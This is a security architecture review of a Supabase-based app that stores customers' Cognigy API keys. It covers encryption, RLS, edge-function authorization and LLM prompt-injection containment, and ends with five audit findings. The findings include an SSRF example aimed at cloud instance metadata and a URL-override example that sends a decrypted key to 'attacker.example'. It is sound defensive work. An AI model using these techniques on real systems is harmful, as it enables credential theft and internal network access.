# Security Architecture & Review

**Scope:** the whole build — React SPA, six Supabase Edge Functions, Postgres schema/RLS, Storage buckets.
**Reviewed:** 2026-07-31, against `main` (migrations `0001`–`0007`).
**Method:** manual read of every migration, every edge function, the Supabase client init, and the auth context. Grep sweep for XSS sinks and privileged-client misuse.

The threat model is specific: **the app custodies other people's Cognigy/CXone API keys.** A Cognigy API key is a bearer credential with broad authority over a customer's agent — it can read conversation logs (containing end-user PII), export snapshots of the entire agent, and promote a snapshot over production. So the primary asset isn't the app's own data; it's the keys. Every pattern below follows from that.

---

## Part 1 — The patterns, and why they were chosen

### 1. The key never reaches the browser (proxy-all pattern)

**Pattern.** No Cognigy call is ever made from the browser. The client sends `api_key_id` (a UUID) to an Edge Function; the function decrypts the key server-side, calls Cognigy, and returns only the response body. The UI is given `key_last4` and nothing else.

**Why.** The obvious alternative — fetch the key into the SPA and call Cognigy directly — puts a live credential in browser memory, in the network tab, in any error-reporting SDK, and within reach of any XSS or malicious extension. And it can't be undone: once the browser has held the key, you must assume it's compromised. A UUID handle is worthless to an attacker without a valid session.

This is why `cognigy-proxy` exists at all despite being an extra hop, and why `knowledge-upload` is a *separate* function: the Cognigy upload endpoint needs `multipart/form-data`, and rather than loosen `cognigy-proxy` (JSON-only) into a general content-type passthrough, a second narrow function was added. Narrow functions over one permissive one.

### 2. Authorize with the user's JWT; act with `service_role` — in that order

Every function follows the identical five-step shape:

```ts
// 1. Reject unauthenticated callers outright
const authHeader = req.headers.get("Authorization");
if (!authHeader) return json({ error: "missing authorization" }, 401);

// 2. A client bound to the CALLER's JWT — subject to RLS
const userClient = createClient(URL, ANON_KEY, {
  global: { headers: { Authorization: authHeader } },
});
const { data: userData, error } = await userClient.auth.getUser();
if (error || !userData.user) return json({ error: "unauthorized" }, 401);

// 3. Ownership decision made THROUGH RLS, using the user client
const { data: ownership } = await userClient
  .from("api_keys").select("id").eq("id", api_key_id).maybeSingle();
if (!ownership) return json({ error: "api key not found" }, 404);

// 4. Only now escalate
const admin = createClient(URL, SERVICE_ROLE_KEY);
const { data } = await admin.rpc("get_api_key_plaintext", { ... });
```

**Why this ordering is the whole ballgame.** The tempting shortcut is to use the `service_role` client for step 3 — it's already needed in step 4, and the query is simpler. That shortcut is a **complete cross-tenant authorization bypass**: `service_role` ignores RLS, so `.eq("id", api_key_id)` would return *any* user's key row, and any authenticated user could decrypt and use any other customer's Cognigy key by guessing or enumerating UUIDs. The ownership check is only meaningful because it runs as the caller.

The rule the codebase encodes: **the privileged client is never used to decide anything, only to do something already decided.** All six functions honour it, including `snapshot-worker`, which checks the caller owns the `snapshot_promotions` job row via `userClient` before touching it with `admin`.

`verify_jwt = true` is also set per-function in `config.toml`, so the platform rejects unauthenticated requests before the function body even runs. The in-code check is kept anyway — the deploy flag is configuration and can drift; the code check can't.

### 3. Encryption at rest with the master key in Vault, never in app code

**Pattern.** `api_keys.key_encrypted` holds `pgp_sym_encrypt(plaintext, master_key)` base64-encoded. The master key is 256 bits from `gen_random_bytes(32)`, generated *by the migration itself* into Supabase Vault, and read only by `_get_encryption_key()` — a `SECURITY DEFINER` function with `revoke all ... from public`.

**Why.** Three alternatives were available and each is worse:

| Alternative | Why rejected |
|---|---|
| Key in an env var / Edge Function secret | Readable by anyone who can view function config or exfiltrate the environment; couples key rotation to redeploys; the key would be in the same blast radius as application code. |
| Key derived from something client-supplied | Requires the client to hold key material — reintroduces exactly the problem §1 solves. |
| No encryption, rely on RLS alone | RLS protects the API surface, not the data. A leaked database backup, a snapshot restore, a misconfigured read replica, or a support engineer with SQL access all yield plaintext keys. |

Vault keeps the master key out of the app's reach entirely: application code has no code path that reads it, and nothing carries it over the wire. Migration `0002` generates it **idempotently** — guarded by `if not exists` — because a re-run that rotated the key would silently orphan every existing ciphertext into undecryptable garbage. That guard is deliberate, not incidental.

`pgp_sym_encrypt` also salts internally, so two customers who paste the same key don't produce matching ciphertext — no equality-based inference across rows.

### 4. `SET search_path` on every `SECURITY DEFINER` function

Every definer function pins `set search_path = public, extensions, pg_catalog`.

**Why.** This is the classic Postgres privilege-escalation vector: a `SECURITY DEFINER` function runs with the *definer's* rights, and if the search path is attacker-influenced, a caller who can create objects in an earlier-resolving schema can shadow `pgp_sym_encrypt` (or any called function) with their own trojan and have it execute as the definer — which here means as the owner of the decryption routine. Pinning the path closes it. Easy to omit, and its absence is silent, which is exactly why it's worth calling out as a deliberate control rather than boilerplate.

### 5. Asymmetric RLS on `api_keys` — reads via policy, writes via RPC only

```sql
alter table public.api_keys enable row level security;
create policy api_keys_select_own ... for select using (auth.uid() = user_id);
create policy api_keys_delete_own ... for delete using (auth.uid() = user_id);
-- deliberately NO insert or update policy
```

With RLS on and no policy for a command, that command is **denied** — so clients cannot `INSERT` or `UPDATE` an api_key row at all. Writes go through `create_api_key()` / `update_api_key()`.

**Why.** If the client could insert directly it would have to supply either ciphertext (impossible — it has no master key) or plaintext into a column (which would then be stored raw). Routing through an RPC means plaintext exists only as a function argument and is encrypted inside the same statement that inserts it. It never lands in a client-authored SQL string, and `right(p_key_plaintext, 4)` derives `key_last4` server-side so the two can't disagree.

`get_api_key_plaintext` is granted to `service_role` **only**. Even a caller with a perfectly valid user JWT cannot invoke it — `authenticated` has no EXECUTE privilege. Decryption is unreachable from the browser by grant, not merely by convention.

### 6. Ownership validated on *every* referenced ID, not just the primary one

`start_snapshot_job()` independently checks the caller owns the target project, the target api_key, the source snapshot, and the source api_key — four separate checks.

**Why.** Checking only the "main" object is a common and subtle hole. Here it would permit **cross-tenant stitching**: pass your own `target_project_id` with another customer's `target_api_key_id` and you'd promote a snapshot into their agent using their credential. Authorization has to cover every object a request touches, not the one that names it.

### 7. Storage: private by default, signed URLs, no ambient access

- **`snapshots` bucket: `public = false`.** Reads happen only through `sign_download`, which verifies ownership via `userClient` against `snapshots` RLS, then mints a **5-minute** signed URL with `service_role`. Writes are worker-only.
- Download filenames are sanitized (`replace(/[^\w.-]+/g, "_")`) — blocks header injection and path traversal via a hostile snapshot name.
- **`avatars` bucket: `public = true`** — a deliberate, scoped exception so `<img src>` works without an auth dance. Writes are constrained by `(storage.foldername(name))[1] = auth.uid()::text`, so a user can only write inside their own `{uid}/` folder. Bucket-level `file_size_limit` (2 MB) and `allowed_mime_types` (png/jpeg/webp/gif) are enforced by Storage, not by the client.

Short signed-URL TTLs matter because `.csnap` archives are a full export of a customer's agent — a leaked long-lived URL would be a complete agent disclosure to anyone holding the link.

### 8. Server-side re-enforcement of client limits

`scraper` re-checks every bound the UI already enforces: `HARD_MAX_URLS_PER_REQUEST`, `HARD_MAX_DOCS_PER_REQUEST`, `HARD_MAX_DOC_TEXT_CHARS`, chunk-size floors/ceilings, `FETCH_TIMEOUT_MS`.

**Why.** Client-side validation is a UX affordance; it is not a control, because the client is attacker-controlled. The comment in the source says it plainly — *"Re-enforced server-side so a misbehaving client can't OOM the function."* Same reasoning behind `MAX_AGENT_ITERATIONS = 8` and the pagination caps in `session-analyzer`: bound the work an untrusted caller can induce.

### 9. AI-specific containment (`session-analyzer`)

Cognigy log content is **untrusted input** — it contains whatever end users typed — and it goes into a model's context window, so prompt injection must be assumed possible, not prevented. The design contains the consequence instead of pretending to stop the cause:

- The agent has exactly **one** tool, and it is **read-only** (`get_logs`). There is no write, no delete, no promote, no shell, no arbitrary fetch. A successful injection can make the model say something wrong; it cannot make it *do* anything.
- Output is rendered as **text**, never HTML (no `dangerouslySetInnerHTML` anywhere in the client — verified by grep), so injected markup can't become XSS.
- Iterations are capped at 8, so an injection can't drive an unbounded tool loop.
- The `ANTHROPIC_API_KEY` and the Cognigy key both stay server-side; the browser never sees either.

Least-privilege tool design is the actual defense for LLM agents. Prompt-level instructions ("ignore malicious instructions") are not a security boundary.

### 10. Data isolation and lifecycle

Every table (`customers`, `projects`, `api_keys`, `snapshots`, `snapshot_promotions`) has RLS enabled with `auth.uid() = user_id` policies. All FKs cascade on delete, so removing a customer removes its projects, keys, and encrypted material together — no orphaned ciphertext accumulating with no owner and no expiry.

### 11. Platform abstraction keeps auth details server-side

`0007_platform` returns `platform` alongside the decrypted key, and `cognigy-proxy` decides from it whether the credential goes in a `?apikey=` query param (Cognigy) or an `apikey` header (CXone), and which OData host to target. The browser never learns where the key goes or in what form. Adding CXone therefore added **zero** client-side credential handling — the trust boundary didn't move.

---

## Part 2 — Findings from this review

The architecture above is sound, and the parts that matter most (the authorize-then-escalate ordering, the encryption model, the grant boundary on decryption) are correct. This review did surface **five real weaknesses**, two of which deserve attention before this handles a customer's production credentials. Documenting them is the point of a review — the strong design is what makes the remaining gaps worth fixing rather than moot.

### F-1 — SSRF in `scraper` (highest priority)

**`functions/scraper/index.ts:221`** — `urls[]` comes straight from the request body and is passed to `fetch(url)` with **no scheme or host validation**. `isValidUrl()` exists in the same file but is only applied to hrefs *discovered inside* fetched HTML, never to the caller's input.

Any authenticated user can make the function fetch `http://169.254.169.254/latest/meta-data/` (cloud instance metadata), `http://localhost:*`, or any RFC-1918 address, and the response body is chunked into `.ctxt` and **returned to them**. That is a read primitive against anything the function's network position can reach.

**Fix:** validate before fetching — require `http:`/`https:`, resolve the hostname and reject loopback / link-local / private / CGNAT ranges, and set `redirect: "manual"` (or re-validate after each hop) so a public URL can't 302 into an internal one.

### F-2 — `cognigy-proxy` sends the decrypted key to a caller-chosen host

**`functions/cognigy-proxy/index.ts:136`** — `new URL(path, base_url)`. If `path` is an **absolute URL**, it overrides `base_url` entirely:

```js
new URL("https://attacker.example/x", "https://api-app-us.cognigy.ai")
// → https://attacker.example/x
```

The request then goes to that host **with `X-API-Key: <decrypted plaintext key>` attached**. A caller can retrieve their own plaintext key by pointing the proxy at a listener they control.

This requires a valid session and a key the caller owns, so it isn't cross-tenant. But it **inverts the invariant the entire design exists to establish** — "the plaintext key is not obtainable through the browser." Under XSS, a malicious extension, or a compromised dependency in the SPA, it becomes real key exfiltration, and everything in §1 and §3 stops paying off.

**Fix:** reject any `path` that doesn't start with `/`, and assert `new URL(finalUrl).origin === new URL(base_url).origin` immediately before `fetch`. The `odata` branch is already safe — `buildOdataUrl` rebuilds the host from `base_url` and only takes the pathname from the caller. Apply the same discipline to the `rest` branch.

### F-3 — Unvalidated `cognigy_project_id` interpolated into a request path

**`functions/session-analyzer/index.ts:317`** — `` `/new/v2.0/projects/${ctx.cognigyProjectId}/logs` `` with no format check. A value containing `?`, `#`, or `../` reshapes the request (query injection, path traversal), though it stays on the customer's own host so impact is limited.

**Fix:** validate `/^[a-f0-9]{24}$/` on entry — the ID format is already known and fixed.

### F-4 — `Access-Control-Allow-Origin: *` on all six functions

Not directly exploitable today: auth is a bearer token in `localStorage`, not a cookie, so there are no ambient credentials for a cross-origin page to ride, and it can't read the token either. But it discards a free layer — any origin can invoke these functions with a token obtained some other way — and it will become load-bearing if auth ever moves to cookies.

**Fix:** allowlist the app origin(s) and echo the request origin only on a match.

### F-5 — `cognigy-proxy` is an unrestricted API passthrough, and nothing is rate-limited

`method` and `path` are both fully caller-controlled, making the function a generic Cognigy client rather than a least-privilege proxy — a caller can issue `DELETE` against any endpoint their key permits. Bounded by the key's own Cognigy permissions, so this is a *blast-radius* concern rather than a bypass; it argues for provisioning read-only Cognigy keys wherever a tool only reads. Separately, no function is rate-limited, and two are cost-amplifying (`scraper` makes outbound fetches, `session-analyzer` spends Anthropic tokens).

**Fix:** consider a path/method allowlist per tool; add per-user rate limiting on `scraper` and `session-analyzer`.

### Configuration note

`config.toml:30` has `enable_confirmations = false`. That's the **local** dev stack, and cloud auth settings live in the Supabase dashboard — but it's worth confirming confirmations are **on** in cloud, since the repo file reads as the project's intent and this one contradicts it.

Also: `cognigy-snapshots` and `snapshot-worker` have no `[functions.*]` block, so they rely on the platform default for `verify_jwt` rather than stating it. They both check the JWT in code, so this is a consistency nit, not a hole — but making it explicit costs two lines.

---

## Summary

| Control | Status |
|---|---|
| Keys never exposed to the browser | ✅ By design; see F-2 for the one path that breaks it |
| Encryption at rest, master key in Vault | ✅ |
| Decryption unreachable from client (grant-level) | ✅ |
| Authorize as caller, act as `service_role` | ✅ All six functions |
| `SET search_path` on definer functions | ✅ |
| RLS on all tables, all references ownership-checked | ✅ |
| Private storage + short-lived signed URLs | ✅ |
| Server-side enforcement of client limits | ✅ |
| Read-only tools for the LLM agent | ✅ |
| No XSS sinks in the client | ✅ Verified |
| Outbound request validation (SSRF) | ❌ F-1, F-2 |
| CORS origin allowlist | ⚠️ F-4 |
| Rate limiting | ❌ F-5 |

**Priority order:** F-1, then F-2 (both are small, local changes), then F-3. F-4 and F-5 are hardening.
